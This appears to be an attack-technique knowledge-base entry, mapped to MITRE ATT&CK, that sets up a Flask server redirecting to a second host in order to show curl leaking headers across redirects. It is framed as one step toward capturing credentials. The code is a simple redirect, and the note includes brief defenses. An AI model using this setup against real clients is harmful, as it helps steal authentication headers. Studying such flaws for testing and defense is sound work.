---
tags:
  - flask
  - redirect
  - setup
type: procedure
tools:
  - '[[tools/Flask]]'
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/flask-redirect-setup]]'
verified: false
platforms:
  - macOS
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Unsecured Credentials]]'
updated_at: '2025-12-14T17:28:36.559Z'
sub_techniques: []
id: 11377c86-7442-4f43-9ab3-93640f1c995d
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Unsecured Credentials]]'
---
# Set-Up-Redirect-Server-with-Flask

## Summary

This procedure sets up a simple Flask web server on Server1 that redirects all requests to the root path to an external host (Server2), simulating a scenario where a legitimate or malicious site redirects users to an attacker-controlled endpoint to capture leaked headers.

## Description

In the context of testing curl's redirect behavior, this procedure creates a minimal HTTP server using Flask on port 8000. The server responds to GET requests on '/' with a 302 redirect to 'http://server2:8081/'. This setup allows demonstration of header forwarding issues when curl follows the redirect with the -L flag. Prerequisites include Python 3 and Flask installed on Server1; the environment should allow binding to port 8000.

## Requirements

1. Python 3 environment with Flask installed (pip install flask)
2. Access to Server1 with port 8000 available
3. Network connectivity to Server2 on port 8081
4. Administrative privileges if ports below 1024 are needed (not here)

## Defense

Defensive measures and detection strategies:

- Monitor for unexpected redirects in web applications using WAF rules
- Use HTTPS-only redirects to prevent interception
- Audit client tools like curl for known vulnerabilities (e.g., update to patched versions)

## Objectives

1. Establish a redirect endpoint to trigger curl's header handling flaw
2. Simulate cross-host redirect for credential exposure testing
3. Verify server setup before proceeding to capture phase

## Instructions

### Step 1: Create Flask Application

**Context**: Write a simple Python script to define the redirect route.

**Command** ([[commands/flask-redirect-setup]]):
```bash
cat > app.py << EOF
from flask import Flask, redirect

app = Flask(__name__)

@app.route('/')
def redirect_to_server2():
    return redirect('http://server2:8081/', code=302)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)
EOF
```

> This creates app.py with a Flask app that listens on all interfaces (0.0.0.0) on port 8000 and redirects '/' to Server2.

### Step 2: Run the Flask Server

**Context**: Start the server to begin listening for requests.

**Command** ([[commands/flask-redirect-setup]]):
```bash
python app.py
```

> Expected output: '* Running on http://0.0.0.0:8000'. Test with curl http://server1:8000 to confirm 302 redirect.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]] Collection

### Techniques

- [[Unsecured Credentials]] Unsecured Credentials

### Sub-Techniques


## Commands Used

- [[commands/flask-redirect-setup]]

## Tools Used

- [[tools/Flask]]

## Tags

- flask
- redirect
- http-server
